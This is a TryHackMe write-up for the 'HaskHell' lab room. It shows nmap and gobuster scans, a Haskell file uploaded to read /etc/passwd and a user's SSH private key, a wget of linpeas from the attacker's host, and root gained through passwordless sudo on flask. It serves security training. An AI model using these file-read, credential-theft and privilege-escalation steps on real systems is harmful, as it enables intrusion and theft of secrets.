    "title": "Tryhackme - HaskHell | EN",
    "url": "/posts/Tryhackme-HaskHell/",
    "categories": "Writeup, TryHackme",
    "tags": "web, flask, haskell, tryhackme, writeup",
    "date": "2022-05-30 10:10:00 +0300",
    





    "snippet": "InformationRoom  Name: HaskHell  Profile: HaskHell  Difficulty: Medium  Description: Show your professor that his PhD isn’t in security.OverviewIt’s a nice room , that you can use haskell and read file inside server . Privilege escalation step was easy actually that you can access root so fast .Write-upLet’s start enumeration and see what we can gather.Network enumerationPort and service scan with nmap:nmap -T4 -sV -sS  -v -p- 10.10.238.6  -sC -oN HaskHellOutput:# Nmap 7.92 scan initiated Mon May 30 09:26:16 2022 as: nmap -n -Pn -T4 -sV -sS -v -p- -sC -oN HaskHell 10.10.238.6Nmap scan report for 10.10.238.6Host is up (0.084s latency).Not shown: 65533 closed tcp ports (reset)PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)|   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)|_  256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)5001/tcp open  http    Gunicorn 19.7.1|_http-title: Homepage| http-methods:|_  Supported Methods: OPTIONS HEAD GET|_http-server-header: gunicorn/19.7.1Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelit’s look we just have ssh and http open with different port , let’s go and enumerate http port.Web enumerationDiscovering directories and files with go buster.gobuster dir -u http://10.10.238.6:5001/ -w $BIG -t 50Let’s enumerate files and folders then:Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.10.238.6:5001/[+] Method:                  GET[+] Threads:                 50[+] Wordlist:                /home/batmanly/SecLists/Discovery/Web-Content/big.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.1.0[+] Timeout:                 10s===============================================================2022/05/30 09:31:01 Starting gobuster in directory enumeration mode===============================================================/submit               (Status: 200) [Size: 237]===============================================================2022/05/30 09:32:11 Finished===============================================================We found submit directory let’s go and see what’s there. we realized that server is waiting our haskell file for compile and return result.we can try to upload haskhell file and try to read file or get reverse shell , i tried get reverse shell but server givin 500 message , so after time i tried reading files it’s look we have permission to read file, so lets’ get to work and first read /etc/passwd and see what user we can enumerate than we will read this user ssh private key for connect to server with ssh . We can use burpsuite for that we can manipulate easily request and response.http://10.10.238.6:5001/submitupload this file , read_file.hs .import System.Processmain = do   let file_to_read = &quot;/etc/passwd&quot;   contents &amp;lt;- readFile file_to_read   putStrLn contentsafter upload file we can read passwd.let’s go and read user’s id_rsa file. we can enumeate user after start 1000 for this file.i found that we can read prof id_rsa file .change read_file.hs to read ‘/home/prof/.ssh/id_rsa’ and get ssh private key.Web exploitationlet’s use this ssh private key to connect server.chmod 600 haskhellssh prof@10.10.238.6 -i haskhellPrevilege Escalationlet’s upload linpeas and look if we can get any previlege escalation point to root or other user.# Run Python Serverpython3 -m http.server 80# Get Linpeaswget http://10.8.199.191/linpeas.sh# Run Linpeaschmod +x linpeas.sh./linpeas.shwe found that we can run flask with sudo without password , so let’s get root shell from there.echo &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; &amp;gt; shell.pyexport FLASK_APP=shell.pysudo /usr/bin/flask runYep. Now we Got root.Thanks for reading until the end , if you have any feedback i will appreciate to get , knowing different ways to get root always good for me."
  }
  
]

